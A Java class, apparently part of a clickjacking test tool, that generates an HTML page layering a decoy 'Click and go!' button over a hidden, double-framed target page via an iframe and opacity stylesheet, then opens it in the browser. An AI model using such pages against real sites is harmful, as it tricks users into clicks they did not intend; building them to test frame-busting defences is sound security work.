package com.dependability.clickjacking.creation.doubleFraming;

import java.awt.Desktop;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;

import com.dependability.clickjacking.clickInterface.ClickJacking;
import com.dependability.clickjacking.file.FileCustom;

public class Fictitious2 implements ClickJacking {
	String src;
	private File f;
	private Fictitious1 fictitious;
	
	public Fictitious2(String src) throws IOException{
		this.src = src;
		f = (new FileCustom("src/main/webapp/html_generated/fictitious2.html")).getFile();
		fictitious = new Fictitious1(src);
	}
	@Override
	public void creation() throws IOException{
		Fictitious1 fictitious = new Fictitious1(src);
		fictitious.creation();
        BufferedWriter bw = new BufferedWriter(new FileWriter(f));
        bw.write("<html><head>\r\n"
        		+ "<link rel=\"stylesheet\" href=\"CSS/opacity.css\">\r\n"
        		+ "    </head>\r\n"
        		+ "    <body>\r\n"
        		+ "        <div id=\"content\">\r\n"
        		+ "            <h1>Malicius Link</h1>\r\n"
        		+ "            <form action=\"http://www.owasp.com\">\r\n"
        		+ "                <input type=\"submit\" class=\"button\" value=\"Click and go!\">\r\n"
        		+ "            </form>");
	    bw.write("<iframe src =\"" + fictitious.getHtmlFile().getName() + "\"  id=\"clickjacking\" width=\"500\" height=\"500\" scrolling=\"no\" frameborder=\"none\" class=\"malicious\"></iframe>");
	    bw.write("</body></html>");
	    bw.close();
	}
	
	@Override
	public String getSrc() {
		return src;
	}
	
	@Override
	public void setSrc(String src) {
		this.src = src;
		
	}
	
	@Override
	public File getHtmlFile() {
		return f;
	}
	public File getHtmlFile2() {
		return fictitious.getHtmlFile();
		}
	
	@Override
	public void setHtmlFile(File f) {
		this.f = f;
	}
	@Override
	public void run() throws IOException {
		Desktop.getDesktop().browse(f.toURI());
		
	}
	
}
